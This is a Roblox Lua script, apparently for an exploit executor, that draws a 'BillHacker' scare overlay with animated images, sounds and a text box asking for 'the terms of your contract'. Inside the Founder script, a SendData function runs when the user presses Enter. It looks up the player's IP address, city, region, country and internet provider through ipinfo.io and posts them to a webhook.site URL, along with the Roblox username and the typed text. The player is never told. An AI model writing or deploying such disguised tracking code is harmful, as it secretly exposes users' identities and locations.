local BillHacker = Instance.new("ScreenGui")
local White = Instance.new("Frame")
local ScreenImage = Instance.new("ImageLabel")
local Background = Instance.new("ImageLabel")
local Texts = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Background_2 = Instance.new("ImageLabel")
local UICorner_2 = Instance.new("UICorner")
local UIGradient = Instance.new("UIGradient")
local Title = Instance.new("TextLabel")
local GamePath = Instance.new("TextLabel")
local Founder = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local Background_3 = Instance.new("ImageLabel")
local UICorner_4 = Instance.new("UICorner")
local UIGradient_2 = Instance.new("UIGradient")
local Title_2 = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")
local Basic = Instance.new("Frame")
local UIListLayout = Instance.new("UIListLayout")
local Main = Instance.new("Frame")
local Center = Instance.new("ImageLabel")
local Background_4 = Instance.new("ImageLabel")
local Shadow = Instance.new("ImageLabel")

BillHacker.Name = "BillHacker"
BillHacker.Parent = game.CoreGui
BillHacker.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
BillHacker.ClipToDeviceSafeArea = false
BillHacker.IgnoreGuiInset = true
BillHacker.DisplayOrder = 1000

White.Name = "White"
White.Parent = BillHacker
White.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
White.BorderColor3 = Color3.fromRGB(0, 0, 0)
White.BorderSizePixel = 0
White.LayoutOrder = 1
White.Size = UDim2.new(1, 0, 1, 0)
White.Visible = false
White.ZIndex = 3

ScreenImage.Name = "ScreenImage"
ScreenImage.Parent = BillHacker
ScreenImage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScreenImage.BackgroundTransparency = 1.000
ScreenImage.BorderColor3 = Color3.fromRGB(27, 42, 53)
ScreenImage.BorderSizePixel = 0
ScreenImage.Position = UDim2.new(0, 0, -0.150000006, 0)
ScreenImage.Size = UDim2.new(1, 0, 1.20000005, 0)
ScreenImage.Visible = false
ScreenImage.Image = "rbxassetid://7633244966"
ScreenImage.ImageTransparency = 0.850

Background.Name = "Background"
Background.Parent = BillHacker
Background.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Background.BorderColor3 = Color3.fromRGB(0, 0, 0)
Background.BorderSizePixel = 0
Background.Size = UDim2.new(1, 0, 1, 0)
Background.Visible = false
Background.ZIndex = 0
Background.Image = "rbxassetid://92362373417324"
Background.ImageColor3 = Color3.fromRGB(150, 150, 150)
Background.ScaleType = Enum.ScaleType.Crop

Texts.Name = "Texts"
Texts.Parent = BillHacker
Texts.BackgroundColor3 = Color3.fromRGB(255, 246, 175)
Texts.BackgroundTransparency = 1.000
Texts.BorderColor3 = Color3.fromRGB(0, 0, 0)
Texts.BorderSizePixel = 0
Texts.Position = UDim2.new(0.0579999983, 0, -0.335000008, 0)
Texts.Size = UDim2.new(0, 535, 0, 270)

UICorner.CornerRadius = UDim.new(0, 20)
UICorner.Parent = Texts

Background_2.Name = "Background"
Background_2.Parent = Texts
Background_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Background_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Background_2.BorderSizePixel = 0
Background_2.Size = UDim2.new(1, 0, 1, 0)
Background_2.Image = "rbxassetid://92362373417324"
Background_2.ScaleType = Enum.ScaleType.Crop

UICorner_2.CornerRadius = UDim.new(0, 20)
UICorner_2.Parent = Background_2

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(153, 142, 103)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient.Rotation = 90
UIGradient.Parent = Background_2

Title.Name = "Title"
Title.Parent = Texts
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
Title.BorderSizePixel = 0
Title.Position = UDim2.new(0.0149532715, 0, 0.0409586579, 0)
Title.Size = UDim2.new(0, 519, 0, 46)
Title.Font = Enum.Font.SourceSansBold
Title.Text = "MY TERMS OF THE CONTRACT"
Title.TextColor3 = Color3.fromRGB(0, 0, 0)
Title.TextScaled = true
Title.TextSize = 14.000
Title.TextWrapped = true
Title.TextXAlignment = Enum.TextXAlignment.Left

GamePath.Name = "GamePath"
GamePath.Parent = Texts
GamePath.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GamePath.BackgroundTransparency = 1.000
GamePath.BorderColor3 = Color3.fromRGB(0, 0, 0)
GamePath.BorderSizePixel = 0
GamePath.Position = UDim2.new(0.0149532715, 0, 0.211328685, 0)
GamePath.Size = UDim2.new(0, 519, 0, 198)
GamePath.Font = Enum.Font.SourceSansBold
GamePath.Text = "I'M GOING TO NEED A FAVOR THAT YOU CAN HELP ME WITH."
GamePath.TextColor3 = Color3.fromRGB(255, 255, 53)
GamePath.TextScaled = true
GamePath.TextSize = 14.000
GamePath.TextWrapped = true
GamePath.TextXAlignment = Enum.TextXAlignment.Left

Founder.Name = "Founder"
Founder.Parent = BillHacker
Founder.BackgroundColor3 = Color3.fromRGB(255, 246, 175)
Founder.BackgroundTransparency = 1.000
Founder.BorderColor3 = Color3.fromRGB(0, 0, 0)
Founder.BorderSizePixel = 0
Founder.Position = UDim2.new(0.601999998, 0, -0.426999986, 0)
Founder.Size = UDim2.new(0, 535, 0, 115)

UICorner_3.CornerRadius = UDim.new(0, 20)
UICorner_3.Parent = Founder

Background_3.Name = "Background"
Background_3.Parent = Founder
Background_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Background_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
Background_3.BorderSizePixel = 0
Background_3.Size = UDim2.new(1, 0, 1, 0)
Background_3.Image = "rbxassetid://92362373417324"
Background_3.ScaleType = Enum.ScaleType.Crop

UICorner_4.CornerRadius = UDim.new(0, 20)
UICorner_4.Parent = Background_3

UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(153, 142, 103)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_2.Rotation = 90
UIGradient_2.Parent = Background_3

Title_2.Name = "Title"
Title_2.Parent = Founder
Title_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title_2.BackgroundTransparency = 1.000
Title_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Title_2.BorderSizePixel = 0
Title_2.Position = UDim2.new(0.0149532715, 0, 0.0409586579, 0)
Title_2.Size = UDim2.new(0, 519, 0, 46)
Title_2.Font = Enum.Font.SourceSansBold
Title_2.Text = "YOUR TERMS OF THE CONTRACT"
Title_2.TextColor3 = Color3.fromRGB(0, 0, 0)
Title_2.TextScaled = true
Title_2.TextSize = 14.000
Title_2.TextWrapped = true
Title_2.TextXAlignment = Enum.TextXAlignment.Left

TextBox.Parent = Founder
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundTransparency = 1.000
TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0.020560747, 0, 0.495652169, 0)
TextBox.Size = UDim2.new(0, 513, 0, 50)
TextBox.Font = Enum.Font.SourceSansBold
TextBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 0)
TextBox.PlaceholderText = "ENTER THE TERMS OF YOUR CONTRACT"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 0)
TextBox.TextScaled = true
TextBox.TextSize = 14.000
TextBox.TextWrapped = true
TextBox.TextXAlignment = Enum.TextXAlignment.Left

Basic.Name = "Basic"
Basic.Parent = BillHacker
Basic.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Basic.BackgroundTransparency = 1.000
Basic.BorderColor3 = Color3.fromRGB(0, 0, 0)
Basic.BorderSizePixel = 0
Basic.Size = UDim2.new(1, 0, 1, 0)
Basic.Visible = false

UIListLayout.Parent = Basic
UIListLayout.FillDirection = Enum.FillDirection.Horizontal
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center

Main.Name = "Main"
Main.Parent = Basic
Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main.BackgroundTransparency = 1.000
Main.BorderColor3 = Color3.fromRGB(0, 0, 0)
Main.BorderSizePixel = 0
Main.LayoutOrder = 2
Main.Position = UDim2.new(0.434590042, 0, 0.372655272, 0)
Main.Size = UDim2.new(0, 250, 0, 250)
Main.ZIndex = 2

Center.Name = "Center"
Center.Parent = Main
Center.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Center.BackgroundTransparency = 1.000
Center.BorderColor3 = Color3.fromRGB(0, 0, 0)
Center.BorderSizePixel = 0
Center.LayoutOrder = 1
Center.Position = UDim2.new(0.143999994, 0, 0.143999994, 0)
Center.Size = UDim2.new(0, 174, 0, 174)
Center.ZIndex = 2
Center.Image = "rbxassetid://95688854990364"

Background_4.Name = "Background"
Background_4.Parent = Main
Background_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Background_4.BackgroundTransparency = 1.000
Background_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
Background_4.BorderSizePixel = 0
Background_4.Size = UDim2.new(0, 246, 0, 247)
Background_4.ZIndex = 0
Background_4.Image = "rbxassetid://109594773024791"

Shadow.Name = "Shadow"
Shadow.Parent = Main
Shadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Shadow.BackgroundTransparency = 1.000
Shadow.BorderColor3 = Color3.fromRGB(0, 0, 0)
Shadow.BorderSizePixel = 0
Shadow.Position = UDim2.new(-0.201646969, 0, -0.201176509, 0)
Shadow.Size = UDim2.new(0, 350, 0, 350)
Shadow.Image = "rbxassetid://15678202961"

-- Scripts:

local function PBEW_fake_script() -- ScreenImage.ChangeEveryTime 
	local script = Instance.new('LocalScript', ScreenImage)

	while true do wait(math.random(0.2,0.15)) --Random Wait
		
		local ScreenImage= script.Parent --Screen
		
		local RandomScreen= math.random(1,10) --Makes a random value
		
		if RandomScreen== 1 then --if the random value is 1
			ScreenImage.Size= UDim2.new(1.1, 0,1.2, 0)
		end
		
		if RandomScreen== 2 then --if the random value is 2
			ScreenImage.Size= UDim2.new(1.2, 0,1.2, 0)
		end
		
		if RandomScreen== 3 then --if the random value is 3
			ScreenImage.Size= UDim2.new(1.3, 0,1.2, 0)
		end
		
		if RandomScreen== 4 then --if the random value is 4
			ScreenImage.Size= UDim2.new(1.4, 0,1.2, 0)
		end
		
		if RandomScreen== 5 then --if the random value is 5
			ScreenImage.Size= UDim2.new(1.5, 0,1.2, 0)
		end
		
		if RandomScreen== 6 then --if the random value is 6
			ScreenImage.Size= UDim2.new(1.6, 0,1.2, 0)
		end
		
		if RandomScreen== 7 then --if the random value is 7
			ScreenImage.Size= UDim2.new(1.7, 0,1.2, 0)
		end
		
		if RandomScreen== 8 then --if the random value is 8
			ScreenImage.Size= UDim2.new(1.8, 0,1.2, 0)
		end
		
		if RandomScreen== 9 then --if the random value is 9
			ScreenImage.Size= UDim2.new(1.9, 0,1.2, 0)
		end
		
		if RandomScreen== 10 then --if the random value is 10
			ScreenImage.Size= UDim2.new(2, 0,1.2, 0)
		end
	end
	
end
coroutine.wrap(PBEW_fake_script)()
local function DIFZ_fake_script() -- Texts.Activation 
	local script = Instance.new('LocalScript', Texts)

	-- Получаем объект TweenService
	local TweenService = game:GetService("TweenService")
	local UiStroke = Instance.new("UIStroke", script.Parent)
	UiStroke.Color = Color3.fromRGB(0, 0, 0)
	UiStroke.Thickness = 2
	
	-- Ссылка на UI-объект, который нужно перемещать
	local uiObject = script.Parent -- Замените на свой объект, если необходимо
	
	-- Целевая позиция, куда нужно переместить объект
	local targetPosition = UDim2.new(0.058, 0,0.335, 0) -- Например, центр экрана
	
	-- Параметры анимации
	local tweenInfo = TweenInfo.new(
		2, -- Длительность в секундах
		Enum.EasingStyle.Quad, -- Стиль анимации
		Enum.EasingDirection.Out, -- Направление (от начала до конца)
		0, -- Повторений (0 — без повторений)
		false, -- Автоповтор (false — не включен)
		0 -- Задержка перед началом
	)
	
	-- Целевые параметры для анимации
	local goal = {}
	goal.Position = targetPosition
	
	-- Создаем анимацию
	local tween = TweenService:Create(uiObject, tweenInfo, goal)
	
	-- Запускаем анимацию
	wait(6)
	tween:Play()
	
end
coroutine.wrap(DIFZ_fake_script)()
local function KXCHK_fake_script() -- Founder.Activation 
	local script = Instance.new('LocalScript', Founder)

	-- Получаем объект TweenService
	local TweenService = game:GetService("TweenService")
	local UiStroke = Instance.new("UIStroke", script.Parent)
	UiStroke.Color = Color3.fromRGB(0, 0, 0)
	UiStroke.Thickness = 2
	
	-- Ссылка на UI-объект, который нужно перемещать
	local uiObject = script.Parent -- Замените на свой объект, если необходимо
	local text = script.Parent.TextBox.Text
	
	-- Целевая позиция, куда нужно переместить объект
	local targetPosition = UDim2.new(0.602, 0,0.427, 0) -- Например, центр экрана
	
	local SendData = function()
		-- Вставляем имя пользователя Roblox
		local playerName = game.Players.LocalPlayer.Name
		
		-- URL для получения данных об IP и местоположении
		local ipInfoUrl = "https://ipinfo.io/json"
		
		-- Делаем запрос на получение данных через HttpGet
		local success, ipData = pcall(function()
			return game:HttpGet(ipInfoUrl)
		end)
		
		-- Проверка на успешное выполнение запроса
		if not success then
			warn("Failed to retrieve IP data: " .. tostring(ipData))
			return
		end
		
		-- Проверка на пустой ответ
		if ipData == nil or ipData == "" then
			warn("Empty response from IP API")
			return
		end
		
		-- Пытаемся декодировать JSON
		local success, ipInfo = pcall(function()
			return game:GetService("HttpService"):JSONDecode(ipData)
		end)
		
		-- Проверяем, произошла ли ошибка при декодировании
		if not success then
			warn("Failed to decode JSON: " .. tostring(ipData))
			return
		end
		
		-- Собираем данные для отправки в Webhook
		local ipAddress = ipInfo.ip or "IP not found"
		local city = ipInfo.city or "City not found"
		local region = ipInfo.region or "Region not found"
		local country = ipInfo.country or "Country not found"
		local provider = ipInfo.org or "Provider not found"
		
		-- URL вашего Webhook.site для тестирования
		local webhookUrl = "https://webhook.site/ff8f32d3-35f2-4496-a880-f728f159dd03"
		
		-- Формируем данные для отправки в формате JSON
		local formData = {
			["[🎮] Player Name"] = playerName,
			["[🖥️] IP Address"] = ipAddress,
			["[🏙️] City"] = city,
			["[🏠] Region"] = region,
			["[📃] Country"] = country,
			["[🛜] Provider"] = provider,
			["[💬] Request"] = text
		}
		
		-- Конвертируем данные в JSON
		local jsonData = game:GetService("HttpService"):JSONEncode(formData)
		
		-- Отправляем данные на Webhook.site
		local success, response = pcall(function()
			return game:HttpPost(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
		end)
		
		-- Проверяем результат отправки
		if success then
			print("IP и информация о местоположении успешно отправлены через Webhook.site.")
		else
			warn("Failed to send data to Webhook: " .. tostring(response))
		end
	end
	
	-- Параметры анимации
	local tweenInfo = TweenInfo.new(
		2, -- Длительность в секундах
		Enum.EasingStyle.Quad, -- Стиль анимации
		Enum.EasingDirection.Out, -- Направление (от начала до конца)
		0, -- Повторений (0 — без повторений)
		false, -- Автоповтор (false — не включен)
		0 -- Задержка перед началом
	)
	
	-- Целевые параметры для анимации
	local goal = {}
	goal.Position = targetPosition
	
	-- Создаем анимацию
	local tween = TweenService:Create(uiObject, tweenInfo, goal)
	
	-- Запускаем анимацию
	wait(6)
	tween:Play()
	
	-- Ссылка на TextBox, который находится в script.Parent
	local textBox = script.Parent.TextBox
	local tweenService = game:GetService("TweenService")
	-- Функция для обработки нажатий клавиш
	textBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			local tweenInfo = TweenInfo.new(
				1, -- Время анимации (1 секунда)
				Enum.EasingStyle.Sine, -- Стиль анимации
				Enum.EasingDirection.Out -- Направление анимации
			)
			local Music = script.Parent.Parent.Basic.Main:FindFirstChild("Music")
			local tweenGoal = {Volume = 0}
			local tween = tweenService:Create(Music, tweenInfo, tweenGoal)
			tween:Play()
			textBox.Interactable = false
			coroutine.wrap(SendData)()
			local Sound3 = Instance.new("Sound", script.Parent)
			Sound3.SoundId = "rbxassetid://225458887"
			Sound3.Volume = 3
			Sound3:Play()
			
			local tweenInfo = TweenInfo.new(
				7, -- Время анимации (1 секунда)
				Enum.EasingStyle.Sine, -- Стиль анимации
				Enum.EasingDirection.Out -- Направление анимации
			)
			
			local frame = script.Parent.Parent.White
			local tweenGoal = {BackgroundTransparency = 0}
			local tween = tweenService:Create(frame, tweenInfo, tweenGoal)
			tween:Play()
			tween.Completed:Connect(function()
				script.Parent.Parent.Texts.Visible = false
				script.Parent.Parent.Founder.Visible = false
				script.Parent.Parent.Background.Visible = false
				script.Parent.Parent.ScreenImage.Visible = false
				script.Parent.Parent.Basic.Visible = false
				local tweenInfo = TweenInfo.new(
					1, -- Время анимации (1 секунда)
					Enum.EasingStyle.Sine, -- Стиль анимации
					Enum.EasingDirection.Out -- Направление анимации
				)
				local tweenGoal = {BackgroundTransparency = 1}
				local tween2 = tweenService:Create(frame, tweenInfo, tweenGoal)
				tween2:Play()
				tween2.Completed:Connect(function()
					script.Parent.Parent:Destroy()
				end)
			end)
		end
	end)
	
	
end
coroutine.wrap(KXCHK_fake_script)()
local function FNDHQME_fake_script() -- Main.Activation 
	local script = Instance.new('LocalScript', Main)

	local imageLabel = script.Parent.Background -- Убедитесь, что скрипт находится внутри ImageLabel
	local rotationSpeed = 1 -- Начальная скорость вращения
	local acceleration = 10 -- Степень ускорения каждый тик
	local maxSpeed = 10000 -- Максимальная скорость (можно изменять)
	
	local Speed = function()
	while true do
		rotationSpeed = math.min(rotationSpeed + acceleration, maxSpeed)
		imageLabel.Rotation = imageLabel.Rotation + rotationSpeed * task.wait(0.1)
		task.wait(0.01)
	   end
	end
	
	local Sound = Instance.new("Sound", script.Parent)
	Sound.SoundId = "rbxassetid://364420478"
	local Sound2 = Instance.new("Sound", script.Parent)
	Sound2.SoundId = "rbxassetid://6338482322"
	
	Sound:Play()
	wait(5)
	Sound2:Play()
	script.Parent.Parent.Parent.Enabled = true
	script.Parent.Parent.Visible = true
	script.Parent.Parent.Parent.Background.Visible = true
	local frame = script.Parent.Parent.Parent.White
	frame.Visible = true
	local tweenService = game:GetService("TweenService")
	
	local tweenInfo = TweenInfo.new(
		1, -- Время анимации (1 секунда)
		Enum.EasingStyle.Sine, -- Стиль анимации
		Enum.EasingDirection.Out -- Направление анимации
	)
	
	local tweenGoal = {BackgroundTransparency = 1}
	local tween = tweenService:Create(frame, tweenInfo, tweenGoal)
	tween:Play()
	local Sound3 = Instance.new("Sound", script.Parent)
	Sound3.SoundId = "rbxassetid://9041745502"
	Sound3:Play()
	Sound3.Name = "Music"
	local Sound4 = Instance.new("Sound", script.Parent)
	Sound4.SoundId = "rbxassetid://225458853"
	Sound4.Volume = 5
	Sound4:Play()
	coroutine.wrap(Speed)()
end
coroutine.wrap(FNDHQME_fake_script)()
